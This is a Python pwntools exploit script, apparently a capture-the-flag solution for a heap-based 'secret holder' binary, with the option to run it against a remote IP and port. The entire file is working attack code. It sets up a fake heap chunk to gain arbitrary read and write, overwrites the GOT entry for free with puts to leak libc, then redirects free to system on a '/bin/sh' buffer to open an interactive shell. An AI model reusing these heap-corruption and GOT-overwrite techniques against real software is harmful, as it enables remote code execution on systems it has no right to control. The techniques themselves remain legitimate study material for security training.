from pwn import *
import struct
import sys

if len(sys.argv) > 1 and sys.argv[1] == "r":
   r = remote('52.68.31.117', 5566)
   r.settimeout(10)
else:
   r = process("secretholderp")

def recvuntil(val):
   empty = ""
   while True:
      empty += r.recv(1)
      if val in empty:
         break
   print empty
   return empty

@MemLeak
def read_anywhere(addr):
   r.send("3") # renew secret
   recvuntil("3. Huge secret\n")
   r.send("3") # huge secret
   recvuntil("Tell me your secret: \n")
   r.send("/bin/sh\x00" + "a" * 8 + p64(0x602018) + p64(0x602090) + p64(addr) + p32(1) * 3) # got to overwrite
   
   recvuntil("3. Renew secret\n")

   r.send("2") # wipe secret
   recvuntil("3. Huge secret\n")
   r.send("1") # small secret
   res = recvuntil("3. Renew secret\n")

   res = res[:res.find("1. Keep secret")-1]
   res = res[:8]

   return struct.unpack("<Q", res + "\x00" * (8 - len(res)))[0]

def write_anywhere(addr, val):
   r.send("3") # renew secret
   recvuntil("3. Huge secret\n")
   r.send("3") # huge secret
   recvuntil("Tell me your secret: \n")
   r.send("/bin/sh\x00" + "a" * 8 + p64(addr) + p64(0x602090) + p64(addr) + p32(1) * 3) # got to overwrite
   recvuntil("3. Renew secret\n")
   r.send("3") # renew secret
   recvuntil("3. Huge secret\n")
   r.send("2") # small secret
   recvuntil("Tell me your secret: \n")
   r.send(val)
   recvuntil("3. Renew secret\n")

def setup():
   recvuntil("3. Renew secret\n")
   r.send("1") # keep secret
   recvuntil("3. Huge secret\n")
   r.send("3") # huge secret
   #r.interactive()
   recvuntil("Tell me your secret: \n")
   r.send("a") # secret
   recvuntil("3. Renew secret\n")

   r.send("2") # wipe secret
   recvuntil("3. Huge secret\n")
   r.send("3") # huge secret
   recvuntil("3. Renew secret\n")

   r.send("1") # keep secret
   recvuntil("3. Huge secret\n")
   r.send("1") # small secret
   recvuntil("Tell me your secret: \n")
   #r.interactive()
   r.send("a") # secret
   recvuntil("3. Renew secret\n")

   r.send("1") # keep secret
   recvuntil("3. Huge secret\n")
   r.send("2") # big secret
   recvuntil("Tell me your secret: \n")

   r.send("a") # secret
   recvuntil("3. Renew secret\n")

   r.send("2") # wipe secret
   recvuntil("3. Huge secret\n")
   r.send("2") # big secret
   recvuntil("3. Renew secret\n")

   r.send("2") # wipe secret
   recvuntil("3. Huge secret\n")
   r.send("1") # small secret
   recvuntil("3. Renew secret\n")

   r.send("1") # keep secret
   recvuntil("3. Huge secret\n")
   r.send("3") # huge secret
   recvuntil("Tell me your secret: \n")

   fake = p64(0)
   fake += p64(40)
   fake += p64(0x6020A8 - 8 * 3)
   fake += p64(0x6020A8 - 8 * 2) 

   big = p64(32)
   big += p64(0x100)
   big += p64(0) * 31

   fake2 = p64(0x100 + 1)
   fake2 += p64(0) * 31

   wtf = p64(1)
   r.send(fake + big + fake2 + wtf) # secret

   recvuntil("3. Renew secret\n")
   r.send("2") # wipe secret
   recvuntil("3. Huge secret\n")
   r.send("2") # small secret
   recvuntil("3. Renew secret\n")

   write_anywhere(0x602018, p64(0x4006C0)) # change free to puts

setup()

if len(sys.argv) > 1 and sys.argv[1] == "r": # local bins need to rehard code these dep on libc version
   sys_off = 0x45380
   read_off = 0xf69a0
   bin_off = 0x18c58b

   read_addr = read_anywhere(0x602040)
   sys_addr = (read_addr - read_off) + sys_off
   bin_addr = (read_addr - read_off) + bin_off

   write_anywhere(0x602018, p64(sys_addr)) # change free to system
   write_anywhere(0x6020a0, p64(0x602090)) # change free to system

   r.send("2")
   recvuntil("3. Huge secret\n")
   r.send("2")

r.interactive()